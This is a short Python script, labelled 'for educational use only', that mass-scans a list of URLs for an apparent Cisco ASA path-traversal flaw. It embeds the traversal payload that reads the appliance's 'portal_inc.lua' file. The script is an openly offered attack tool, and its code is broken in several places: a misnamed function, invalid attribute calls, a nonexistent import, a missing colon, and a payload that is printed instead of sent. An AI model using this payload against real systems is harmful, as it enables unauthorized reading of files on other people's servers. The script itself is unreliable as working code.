#Coded by Mulvun, for educational use only;)
#!usr/bin/env python

import requests
import sys
import strings
from urllib.parse import quote

requests.packages.urllib3.disable.warnings()
def lists_urls(file_urls):
    with open(file_urls, 'r') as content_file:
        content = content.file.readlines()
        content = [x.strip() for x in content]
        return content

def main(file_urls):
    urls = list_urls(file_urls)
    for url in urls:
        try:
            session = requests.Session()
            url_withpayload = url 
            response = session.get(url.withpayload, verify=False)
            if response.text != 'File not found':
                print(url + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../")
            else
                print(url + ' - Not Vulnerable')
        except:
            print(url + ' - URL parse failed')

if __name__ == '__main__':
    file_urls = sys.argv[1]
    main(file_urls)